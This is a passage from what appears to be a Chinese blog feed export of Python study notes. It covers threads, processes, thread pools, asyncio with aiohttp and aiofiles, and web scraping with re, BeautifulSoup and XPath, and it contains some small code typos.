class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实现方法2：</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span>(<span class="params">Thread</span>):</span>  <span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span>  <span class="comment"># 固定的    -&gt; 当线程被执行的时候, 被执行的就是run()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;子线程&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">t = MyThread()</span><br><span class="line">t.run()  <span class="comment"># 方法的调用了. -&gt; 单线程????</span></span><br><span class="line">t.start()  <span class="comment"># 开启线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主线程&quot;</span>, i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#传参</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">name</span>):</span>  <span class="comment"># ??</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(name, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = Thread(target=func, args=(<span class="string">&quot;周杰伦&quot;</span>,))  <span class="comment"># 传递参数必须是元组(逗号)</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    t2 = Thread(target=func, args=(<span class="string">&quot;王力宏&quot;</span>,))</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h3 id="多进程："><a href="#多进程：" class="headerlink" title="多进程："></a>多进程：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;子进程&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Process(target=func)</span><br><span class="line">    p.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主进程&quot;</span>, i)</span><br></pre></td></tr></table></figure><h2 id="二、线程池"><a href="#二、线程池" class="headerlink" title="二、线程池"></a>二、线程池</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 如何提取单个页面的数据</span></span><br><span class="line"><span class="comment"># 2. 上线程池,多个页面同时抓取</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_one_page</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># 拿到页面源代码</span></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    html = etree.HTML(resp.text)</span><br><span class="line">    table = html.xpath(<span class="string">&quot;/html/body/div[2]/div[4]/div[1]/table&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># trs = table.xpath(&quot;./tr&quot;)[1:]</span></span><br><span class="line">    trs = table.xpath(<span class="string">&quot;./tr[position()&gt;1]&quot;</span>)</span><br><span class="line">    <span class="comment"># 拿到每个tr</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> trs:</span><br><span class="line">        txt = tr.xpath(<span class="string">&quot;./td/text()&quot;</span>)</span><br><span class="line">        <span class="comment"># 对数据做简单的处理: \\  / 去掉</span></span><br><span class="line">        txt = (item.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> txt)</span><br><span class="line">        <span class="comment"># 把数据存放在文件中</span></span><br><span class="line">        csvwriter.writerow(txt)</span><br><span class="line">    <span class="built_in">print</span>(url, <span class="string">&quot;提取完毕!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># for i in range(1, 14870):  # 效率及其低下</span></span><br><span class="line">    <span class="comment">#     download_one_page(f&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/&#123;i&#125;.shtml&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建线程池</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):  <span class="comment"># 199 * 20 = 3980</span></span><br><span class="line">            <span class="comment"># 把下载任务提交给线程池</span></span><br><span class="line">            t.submit(download_one_page, <span class="string">f&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/<span class="subst">&#123;i&#125;</span>.shtml&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;全部下载完毕!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="三、协程"><a href="#三、协程" class="headerlink" title="三、协程"></a>三、协程</h2><p>​    协程应该就是指，在单线程的条件下，合理的安排程序的I/O操作与需要使用cpu的计算操作的交互，进行任务之间的调度，使得cpu空闲机会减少，使用率上升，以达到提高程序运行效率的目的。</p><p>​    在爬虫中，常用到的三个协程模块为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio <span class="comment">#基础协程模块</span></span><br><span class="line"><span class="keyword">import</span> aiohttp <span class="comment">#协程网络请求模块</span></span><br><span class="line"><span class="keyword">import</span> aiofiles <span class="comment">#协程文件读写模块</span></span><br></pre></td></tr></table></figure><h3 id="asyncio基础："><a href="#asyncio基础：" class="headerlink" title="asyncio基础："></a>asyncio基础：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫潘金莲&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫潘金莲&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫王建国&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫王建国&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func3</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫李雪琴&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫李雪琴&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 第一种写法</span></span><br><span class="line">    f1 = func1()</span><br><span class="line">    <span class="keyword">await</span> f1  <span class="comment"># 一般await挂起操作放在协程对象前面</span></span><br><span class="line">    <span class="comment"># 第二种写法(推荐)</span></span><br><span class="line">    tasks = [</span><br><span class="line">        asyncio.create_task(func1()),  <span class="comment"># py3.8以后加上asyncio.create_task()</span></span><br><span class="line">        asyncio.create_task(func2()),</span><br><span class="line">        asyncio.create_task(func3())</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 一次性启动多个任务(协程)</span></span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure><p>总结基础步骤：</p><ol><li><strong>创建带有<code>async</code>关键字的函数，函数中所有异步操作都需要<code>await</code>修饰；</strong></li><li><strong><code>asyncio.create_task(func1())</code>包裹后，丢进任务列表中</strong></li><li><strong><code>await asyncio.wait(tasks)</code>任务列表整体开始执行</strong></li></ol><h3 id="aiohttp的基本使用："><a href="#aiohttp的基本使用：" class="headerlink" title="aiohttp的基本使用："></a>aiohttp的基本使用：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    <span class="string">&quot;http://a.jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://b.jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://c.jpg&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">aiodownload</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># 发送请求.</span></span><br><span class="line">    <span class="comment"># 得到图片内容</span></span><br><span class="line">    <span class="comment"># 保存到文件</span></span><br><span class="line">    name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]  <span class="comment"># 从右边切, 切一次. 得到[1]位置的内容</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:  <span class="comment"># requests</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> resp:  <span class="comment"># resp = requests.get()</span></span><br><span class="line">            <span class="comment"># 请求回来了. 写入文件</span></span><br><span class="line">            <span class="comment"># 可以自己去学习一个模块, aiofiles</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 创建文件</span></span><br><span class="line">                f.write(<span class="keyword">await</span> resp.content.read())  <span class="comment"># 读取内容是异步的. 需要await挂起, resp.text()</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(name, <span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        tasks.append(aiodownload(url))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结基本步骤：</p><ol><li>创建带有<code>async</code>关键字的函数，函数中所有异步操作都需要<code>await</code>修饰；</li><li><strong>使用<code>aiohttp.ClientSession()</code>创建<code>session</code></strong></li><li><strong>使用<code>session</code>中提供的<code>get（）</code>方法请求到url对应的资源</strong></li><li><strong>在已经获得的资源中读取信息也是异步的，需要使用await包裹</strong></li><li><code>asyncio.create_task(func1())</code>包裹后，丢进任务列表中</li><li><code>await asyncio.wait(tasks)</code>任务列表整体开始执行</li></ol><h3 id="aiofiles的基本使用："><a href="#aiofiles的基本使用：" class="headerlink" title="aiofiles的基本使用："></a>aiofiles的基本使用：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">       <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> resp:</span><br><span class="line">           dic = <span class="keyword">await</span> resp.json()</span><br><span class="line"></span><br><span class="line">           <span class="keyword">async</span> <span class="keyword">with</span> aiofiles.<span class="built_in">open</span>(title, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">               <span class="keyword">await</span> f.write(dic[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;novel&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])  <span class="comment"># 把小说内容写出</span></span><br></pre></td></tr></table></figure><p>总结基本步骤：</p><ol><li>创建带有<code>async</code>关键字的函数，函数中所有异步操作都需要<code>await</code>修饰；</li><li>使用<code>aiohttp.ClientSession()</code>创建<code>session</code></li><li>使用<code>session</code>中提供的<code>get（）</code>方法请求到url对应的资源</li><li>在已经获得的资源中读取信息也是异步的，需要使用await包裹</li><li><strong>调用文件操作时，使用<code>async</code>关键字，并使用<code>aiofiles.open</code>替代<code>file.open</code></strong></li><li><strong>在进行文件读写时，需要用<code>await</code>包裹</strong></li><li><code>asyncio.create_task(func1())</code>包裹后，丢进任务列表中</li><li><code>await asyncio.wait(tasks)</code>任务列表整体开始执行</li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python_re爬虫模块（RE、BS4、Xpath）</title>
      <link href="/2022/02/20/python_re%E6%A8%A1%E5%9D%97/"/>
      <url>/2022/02/20/python_re%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="python爬虫模块（RE、BS4、Xpath）"><a href="#python爬虫模块（RE、BS4、Xpath）" class="headerlink" title="python爬虫模块（RE、BS4、Xpath）"></a>python爬虫模块（RE、BS4、Xpath）</h1><h2 id="一、RE模块"><a href="#一、RE模块" class="headerlink" title="一、RE模块"></a>一、RE模块</h2><h3 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h3><p><code>findall</code>：匹配字符串中所有符合正则的内容</p><p><code>finditer</code>：匹配内容后返回迭代器，从迭代器中取数据可以用循环加<code>.group()</code></p><p><code>search</code>：找到一个结果就返回，返回的结果是match对象，取数据可以用<code>.group()</code></p><p><code>match</code>：从头开始匹配，从第一个字母匹配不到就没有（不常用）</p><p><strong>其中，上述内容的调用通过</strong>：<br>    <code>ret=re.findall(r&#39;正则串&#39;,&#39;匹配目标串&#39;)</code>实现调用。</p><h3 id="预加载："><a href="#预加载：" class="headerlink" title="预加载："></a>预加载：</h3><p><em>预加载正则表达式</em><br>（用于正则表达式较长、且多次使用时的封装）</p><p>格式为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+&quot;</span>)</span><br><span class="line">ret = obj.finditer(<span class="string">&quot;目标字串666&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> ret:</span><br><span class="line">    <span class="built_in">print</span>(it.group())</span><br></pre></td></tr></table></figure><h3 id="内容提取："><a href="#内容提取：" class="headerlink" title="内容提取："></a>内容提取：</h3><p>​    正则可以用来匹配固定格式的一串字符串，如<code>&lt;html&gt;xxx&lt;html&gt;</code>，然而当我们不想要两侧的<html>，只想要xxx时，需要从正则中取出不重复信息，即内容提取。</p><p>举例说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;aa&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;qwe&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;bb&#x27;&gt;&lt;span id=&#x27;2&#x27;&gt;qwer&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;cc&#x27;&gt;&lt;span id=&#x27;3&#x27;&gt;qwert&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;dd&#x27;&gt;&lt;span id=&#x27;4&#x27;&gt;qwerty&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;ee&#x27;&gt;&lt;span id=&#x27;5&#x27;&gt;qwertyu&lt;span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#原匹配方式</span></span><br><span class="line"><span class="comment">#obj = re.compile(r&quot;&lt;div class=&#x27;.*?&#x27;&gt;&lt;span id=&#x27;\d+&#x27;&gt;.*?&lt;/span&gt;&lt;div&gt;&quot;,re.S)</span></span><br><span class="line"><span class="comment"># re.S :让.可以匹配换行符</span></span><br><span class="line"></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;div class=&#x27;(?p&lt;name1&gt;.*?)&#x27;&gt;&lt;span id=&#x27;(?P&lt;name2&gt;\d+)&#x27;&gt;(?P&lt;name3&gt;.*？)&lt;/span&gt;&lt;div&gt;&quot;</span>,re.S)</span><br><span class="line">result = obj.finditer(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&#x27;name1&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&#x27;name2&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&#x27;name3&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即，使用<code>(?P&lt;分组名字&gt;原来正则)</code>从正则匹配的内容中进一步提取内容。</p><h2 id="二、BS4模块"><a href="#二、BS4模块" class="headerlink" title="二、BS4模块"></a>二、BS4模块</h2><h3 id="引入方式："><a href="#引入方式：" class="headerlink" title="引入方式："></a>引入方式：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><h3 id="使用方式-以抓取表格为例）："><a href="#使用方式-以抓取表格为例）：" class="headerlink" title="使用方式(以抓取表格为例）："></a>使用方式(以抓取表格为例）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 拿到页面源代码</span></span><br><span class="line"><span class="comment"># 2. 使用bs4进行解析. 拿到数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.xxx.com/a.html&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line"><span class="comment"># 1. 把页面源代码交给BeautifulSoup进行处理, 生成bs对象</span></span><br><span class="line">page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)  <span class="comment"># 指定html解析器</span></span><br><span class="line"><span class="comment"># 2. 从bs对象中查找数据</span></span><br><span class="line"><span class="comment"># find(标签, 属性=值)</span></span><br><span class="line"><span class="comment"># find_all(标签, 属性=值)</span></span><br><span class="line">table = page.find(<span class="string">&quot;table&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;hq_table&quot;</span>&#125;)</span><br><span class="line">trs = table.find_all(<span class="string">&quot;tr&quot;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> trs:  <span class="comment"># 每一行</span></span><br><span class="line">    target_1 = tr.find_all(<span class="string">&quot;td&quot;</span>)  <span class="comment"># 拿到每行中的所有td</span></span><br><span class="line">    target_2 = tds[<span class="number">0</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_3 = tds[<span class="number">1</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_4 = tds[<span class="number">2</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_5 = tds[<span class="number">3</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_6 = tds[<span class="number">4</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_7 = tds[<span class="number">5</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_8 = tds[<span class="number">6</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    <span class="built_in">print</span>(name, low, avg, high, gui, kind, date)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="核心方法："><a href="#核心方法：" class="headerlink" title="核心方法："></a>核心方法：</h3><p><code>find(标签, 属性=值)</code></p><p><code>find_all(标签, 属性=值)</code></p><p>​    按照次序填写要找的标签名和属性名即可。其中，标签名的传参为<strong>字符串</strong>，属性名由于<code>class、id</code>等是python的关键字，可以使用<code>attrs=&#123;键值对&#125;</code>来代替，键值对的键和值均为<strong>字符串</strong>。</p><h2 id="三、Xpath模块"><a href="#三、Xpath模块" class="headerlink" title="三、Xpath模块"></a>三、Xpath模块</h2><p>Xpath是XML文档中搜索的一门语言，html是XML的子集</p><h3 id="模块引入："><a href="#模块引入：" class="headerlink" title="模块引入："></a>模块引入：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br></pre></td></tr></table></figure><h3 id="具体使用："><a href="#具体使用：" class="headerlink" title="具体使用："></a>具体使用：</h3><p>​    若xml为一个字符串形式的，有标签节点组成的xml字符串，从中提取信息可以遵循这样的语法：</p><p>​    注：<strong>Xpath的定位在开发者工具中右键复制选项，可实现智能定位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;book&gt;</span></span><br><span class="line"><span class="string">    &lt;id&gt;1&lt;/id&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;野花遍地香&lt;/name&gt;</span></span><br><span class="line"><span class="string">    